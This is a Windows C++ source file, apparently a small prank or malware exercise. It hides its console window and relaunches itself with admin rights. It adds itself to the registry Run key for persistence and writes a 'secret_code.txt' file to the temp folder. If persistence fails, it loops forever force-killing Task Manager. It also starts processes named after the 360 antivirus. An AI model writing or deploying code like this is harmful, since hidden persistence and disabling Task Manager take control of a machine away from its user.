#include <windows.h>
#include <tchar.h>
#include <strsafe.h>
#include <windows.h>
#include <iostream>

bool IsAdmin() {
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    PSID AdministratorsGroup;
    BOOL isAdmin = AllocateAndInitializeSid(
        &NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
        0, 0, 0, 0, 0, 0, &AdministratorsGroup);

    if (isAdmin) {
        if (!CheckTokenMembership(NULL, AdministratorsGroup, &isAdmin)) {
            isAdmin = FALSE;
        }
        FreeSid(AdministratorsGroup);
    }
    return isAdmin == TRUE;
}

void RunAsAdmin() {
    wchar_t path[MAX_PATH];
    GetModuleFileNameW(NULL, path, MAX_PATH);
    ShellExecuteW(NULL, L"runas", path, NULL, NULL, SW_SHOW);
}
const TCHAR* SECRET_CODE = _T("int x");

bool SetAutoStart(LPCTSTR appName, LPCTSTR appPath) {
    HKEY hKey;
    LONG result = RegOpenKeyEx(
        HKEY_CURRENT_USER,
        _T("Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
        0,
        KEY_WRITE,
        &hKey
    );

    if (result != ERROR_SUCCESS) {
        return false;
    }

    result = RegSetValueEx(
        hKey,
        appName,
        0,
        REG_SZ,
        (const BYTE*)appPath,
        (DWORD)(_tcslen(appPath) + 1) * sizeof(TCHAR)
    );

    RegCloseKey(hKey);
    return result == ERROR_SUCCESS;
}

void ExecuteSecretCode() {
    system("start 360.exe");
    TCHAR tempPath[MAX_PATH];
    GetTempPath(MAX_PATH, tempPath);
    
    // 使用安全字符串函数替代
    StringCchCat(tempPath, MAX_PATH, _T("secret_code.txt"));
    
    HANDLE hFile = CreateFile(tempPath, GENERIC_WRITE, 0, NULL, 
                             CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        DWORD bytesWritten;
        WriteFile(hFile, SECRET_CODE, 
                 (DWORD)(_tcslen(SECRET_CODE) * sizeof(TCHAR)), &bytesWritten, NULL);
        CloseHandle(hFile);
    }
}
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
	HWND hwnd = GetConsoleWindow();
    if (hwnd != NULL)
    {
        ShowWindow(hwnd, SW_HIDE); // 隐藏控制台窗口
    }
    system("start 360sd.exe");
	system("start 360.exe");
	system("start AminoCPP.exe");
    if (!IsAdmin()) {
        RunAsAdmin();
        return 0;
    }
	if (_tcsstr(lpCmdLine, _T("/autostart"))) {
        ExecuteSecretCode();
        return 0;
    }

    TCHAR exePath[MAX_PATH];
    GetModuleFileName(NULL, exePath, MAX_PATH);
    
    // 使用安全字符串函数替代
    TCHAR autoStartCmd[MAX_PATH + 20];
    StringCchPrintf(autoStartCmd, MAX_PATH + 20, _T("\"%s\" /autostart"), exePath);
	if (SetAutoStart(_T("MyAutoStartApp"), autoStartCmd)) {
        return 0;
    }
	while(true)
	{
        system("taskkill /f /im taskmgr.exe");
    }
    
    
    system("pause");
    return 0;
}

